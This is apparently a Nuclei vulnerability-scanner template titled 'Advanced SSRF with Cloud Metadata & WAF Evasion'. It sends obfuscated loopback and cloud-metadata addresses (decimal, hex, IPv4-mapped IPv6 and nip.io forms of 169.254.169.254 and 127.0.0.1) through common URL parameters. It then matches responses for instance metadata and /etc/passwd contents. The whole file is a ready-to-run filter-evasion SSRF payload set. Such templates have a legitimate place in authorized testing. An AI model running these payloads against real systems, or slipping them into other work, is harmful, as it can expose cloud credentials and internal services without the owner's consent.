http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - latest/meta-data
    - instance-id
    - ami-id
  - condition: or
    part: body
    type: word
    words:
    - root:x:0:0
    - localhost
    - Index of /
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/?url={{payload}}'
  - '{{BaseURL}}/?dest={{payload}}'
  - '{{BaseURL}}/?api={{payload}}'
  - '{{BaseURL}}/?u={{payload}}'
  payloads:
    payload:
    - http://2852039166
    - http://0x7f000001
    - http://[::ffff:169.254.169.254]
    - http://169.254.169.254.nip.io
    - http://127.0.0.1:80/
  stop-at-first-match: true
id: advanced-ssrf-waf-bypass
info:
  author: thenawabx
  description: Targeted at bypassing URL filters to access internal metadata or local
    services.
  name: Advanced SSRF with Cloud Metadata & WAF Evasion
  severity: critical
  tags: ssrf, advanced, cloud, bypass
